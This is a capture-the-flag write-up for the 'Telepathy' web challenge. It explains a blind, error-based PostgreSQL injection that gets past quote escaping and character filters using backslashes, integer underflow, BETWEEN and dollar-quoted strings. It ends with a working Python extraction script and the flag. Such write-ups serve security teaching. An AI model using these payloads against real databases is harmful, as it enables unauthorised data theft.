## Telepathy
> Author: chemistrying \
> Category: web \
> Expected Difficulty: 3 \
> Final Points: 500 \
> Solves: 0/38 (Secondary), 0/44 (CUHK), 0/8 (Invited Teams)
> 
> WIP telepathy webpage
> 
> Note: the additional flag format for this problem is `cuhk24ctf{[\w\x2d\x5c]+}`

This is an open-sourced challenge, meaning you know (almost all) the architecture of the server.

The architecture lies below:
- There is a Go backend server and PostgreSQL database server
- Go backend server has two routes: `/` (serving `index.html`) and `/query` (querying database)
- There is a rate limiter in Go backend server which works like this: you have a maximum of 10 tokens, you spend 1 token per request, and 1 token is regenerated every 2 seconds

Observer line 227 to 228 in `main.go`:
```go
preparedStmt := fmt.Sprintf(`SELECT * FROM items WHERE name = E'%s'`, value)
_, err := db.Exec(preparedStmt)
```
Obviously, using string interpolation in database querying statement is extremely dangerous because malicious content can be injected inside.

However, there are some filters to bypass first before injecting. They are:
1. Line 102, 216: Your query string must not match the RegEx `bannedCharacters` (try the behaviour [here](https://regex101.com/r/Jn1768/1))
2. Line 103, 217: You query string must not match the RegEx `bannedWords` (try the behaviour [here](https://regex101.com/r/8JwZA3/1)) 
3. Line 224: Your `'` characters will be "sanitized" to `\'`

In case you don't understand the regular expressions, you should visit the websites and test the beahviours of the regular expressions. But in short, for the first RegEx, you can only use the character set `a-zA-Z0-9{'"_$ }`, backslash and dash characters; for the second RegEx, you can't use `LIKE` or `SIMILAR TO` operators (these are PostgresQL operators, in case if you don't know).

### 1. Bypass single quote replacement
First, we have to bypass condition 3 because that is what it avoids us from escaping the quote character. You can add a backslash in front of the quote character so that the backslash escape the other backslash generated from the "sanitization".

```sql
SELECT * FROM items WHERE name = E'\\''
```
Now we have an additional quote, and we can perform SQL injection.

### 2. Bypass "WIP"
Then, it is important to notice that whatever stuff you put inside the statement, the program returns "WIP". The only exception is generating errors. If you try to generate an error (like a syntax error), the webserver returns the error to you. Notice there are two types of errors:
- *Not* runtime error: like syntax errors or some static expressions. These errors will be pre-calculated before executing the statement.
- Runtime error: happens when you try to execute the expressions on the fly. These errors can't be pre-calculated (that's why they're called "runtime" error, it happens during "runtime")

Runtime error is what we want, since suppose our checking condition is something like this:

```sql
SELECT * FROM items WHERE name = E'\\' OR [Our checking function to check if the flag is correct] AND [Some runtime errors here] -- '
```

First, note that `AND` operator evaluates first before `OR` operator, so the above staetment is equivalent to:

```sql
SELECT * FROM items WHERE name = E'\\' OR ([Our checking function to check if the flag is correct] AND [Some runtime errors here]) -- '
```

Next, if our checking function returns `False`, then the whole condition must be `False`, so the "runtime error" will not be evalulate (due to boolean short-circuit). However, if our checking function returns `True`, then the later part of the condition needs to be evaluate, which ended up a runtime error. Therefore, we can create a blind SQL injection using generated errors:
- If checking function returns `False` -> we get `200 OK` with content `WIP`
- If checking function returns `True` -> we get `400 Bad Request` with content `some error`

After some documentation scrolling in the [PostgreSQL page](https://www.postgresql.org/docs/current/errcodes-appendix.html), you can see some errors related to integer overflow or numeric value out of range. Since in SQL, integers have their own range (for example, for `INT`, the range is $[-2^{31}, 2^{31}-1]$), you can guess that if the number is overflowed, PostgresQL will return `integer overflow` or something similar. So, if we create something like this (suppose no characters are banned at the moment):

```sql
SELECT * FROM items WHERE name = E'\\' OR 2147483647 + 1 = 1 -- '
```

The query will return an error with `pq: integer out of range`. Of course, now the expression is pre-calculated, and we need calculate dynamically. Note that there is a column called `id`, which has type `INT`. Make use of that and we get:

```sql
SELECT * FROM items WHERE name = E'\\' OR id + 2147483647 = 1 -- '
```

Now, we are dynamically calculating the expression.

### 3. Bypass character limitation
Note that from our previous statement, we used `+` and `=`, which is banned according to the webserver implementation. Therefore, we need to use some alternatives.

For the `+` character, we used it for overflowing. Other than overflowing the upper bound, we can also overflow the lower bound (i.e: underflowing). This will also work.

```sql
SELECT * FROM items WHERE name = E'\\' OR id - 2147483647 - 100 = 1 -- '
```

The minus 100 is just to let the `id` goes over the lower bound since for the `id`s in the table, they have some sort of value. It can be anything else (but don't go way over, just enough is OK).

Since we can't use `=` operator, we have to ~~grind~~ read the documentation and see what alternatives we can use. One of the possible operator is `BETWEEN ... AND ...` (if you have alternatives you are welcome to write your writeup and send it to me). 

```sql
SELECT * FROM items WHERE name = E'\\' OR id - 2147483647 - 100 BETWEEN 0 AND 1 -- '
```

We don't really have to care what are the bounds of the BETWEEN operator, since this is not our concern here (our concern is to create an error).

### 4. Create flag checking expression
```sql
SELECT * FROM items WHERE name = E'\\' OR [Our checking function] AND id - 2147483647 - 100 BETWEEN 0 AND 1 -- '
```

The above is a basic template of the SQL injection with payload `\' OR [Our checking function] AND id - 2147483647 - 100 BETWEEN 0 AND 1 -- `, where our checking function means the flag checking expression.

How do we checking the flag? We can make use of `BETWEEN ... AND ...` once again. Note that you can use this operator to transform some typical operations (let $x$ and $y$ be strings such that $x < y$ in terms of lexicographical (dictionary) order):
- `x = y`: `y BETWEEN x AND x`
- `x <= y`: `y BETWEEN x AND [a very large string]`

By 'large', I mean in terms of lexicographical order as well.

Apart from this, using single quote might become a little bit troublesome because the program now adds a backslash in front of your single quote character. Luckily, the webserver allows `$` character which allows us to use [dollar-quoted string constants](https://www.postgresql.org/docs/current/sql-syntax-lexical.html#SQL-SYNTAX-DOLLAR-QUOTING) (essentially another way to represent string literal).

Finally, SQL is by default case-insensitive, which means you have to apply [collation](https://www.postgresql.org/docs/current/collation.html) in order to perform case-sensitive comparision. We will use `C` collation since the order is pretty easy to obtain (this collation compares strictly by their ASCII value).

So, after a lot of prerequisites, let's see some examples.

```sql
SELECT * FROM items WHERE name = E'\\' OR name COLLATE "C" BETWEEN $$Apple$$ AND $$Apple$$ AND id - 2147483647 - 100 BETWEEN 0 AND 1 -- '
```
This statement returns `integer out of range` since there is an "Apple" in the item list.

```sql
SELECT * FROM items WHERE name = E'\\' OR name COLLATE "C" BETWEEN $$Aha$$ AND $$Appld$$ AND id - 2147483647 - 100 BETWEEN 0 AND 1 -- '
```
This statement also returns `integer out of range` since there is an "Aho-Corasick algoithm" in the item list.

```sql
SELECT * FROM items WHERE name = E'\\' OR name COLLATE "C" BETWEEN "zzz" AND "zz}" AND id - 2147483647 - 100 BETWEEN 0 AND 1 -- '
```
This statement returns `WIP` since of course there are no strings with `z` as the beginning character.

## 5. Final script
With these examples, I think you already have a rough a idea about getting the flag:
- By checking `database.py`, we know that the flag is in the description of `Flagmon`. 
- We obtain the prefix of the current flag as left bound, and `prefx + char + '}'` (`+` is concatenation operation, char is our target character) as right bound. These bounds would be used in `BETWEEN` operator.
- Check if there is a description in between our set bound. If yes, then the current character is large enough to include the flag; if no, then the flag isn't in our range.
- We will then obtain a 'turning point'. I mean, if at some point if we find a character `c` which returns `True`, then the previous character of character `c` is the next character of the flag.

For example, the current flag is `cuhk24ctf{test-flag}`, and our prefix is `cuhk24ctf{`, if we query the range between `cuhk24ctf{` and `cuhk24ctf{s}`, then this returns a `False` because 's' is (lexicographically) smaller than 't'. If we query the range between `cuhk24ctf{` and `cuhk24ctf{t}` however, this returns a `True` because `cuhk24ctf{test-flag}` is (lexicographically) smaller than `cuhk24ctf{t}`.

We can do this searching character by character to obtain the final flag. The searching can be sped up with binary search.

```py
import requests, string, time

charset = sorted(string.ascii_letters + string.digits + "{_-\\}", key=lambda x: ord(x))
url = "http://localhost:24021/query"
formatter = "\\' OR description BETWEEN $$Flagmon stores a flag called {left}$$ AND $$Flagmon stores a flag called {right}$$ COLLATE \"C\" AND id - 2147483647 - 100 BETWEEN 0 AND 1 --"

flag = "cuhk24ctf{"

last_attempt = 0

def attempt(char):
    global last_attempt

    # rate limit ourselves according to the source code
    curr = time.time()
    time.sleep(max(0, last_attempt + 1 - curr))

    req = requests.post(url, data={"value": formatter.format(left=flag, right=flag + char + '}')})

    # update the last attempt time
    last_attempt = time.time()
    
    return req.status_code == 400

# returns the character for the next position
def search_func():
    l = -1
    r = len(charset) - 1
    # cuhk24ctf{ <=> cuhk24ctf{}
    # smaller than cuhk24ctf{t -> false
    # larger or equal to cuhk24ctf{t -> true
    while l + 1 < r:
        m = (l + r) >> 1
        if attempt(charset[m]):
            # OK
            r = m
        else:
            l = m
    return charset[r]

while flag[-1] != '}':
    # search
    next_char = search_func()
    flag += next_char
    print(flag)

```

**Flag: `cuhk24ctf{Gulus_says_Bruh-_-ju5t_us3_pr3pAred_s1mt_br0_7c1e1bbaf07fa9d2340a08c9f57a7322}`**
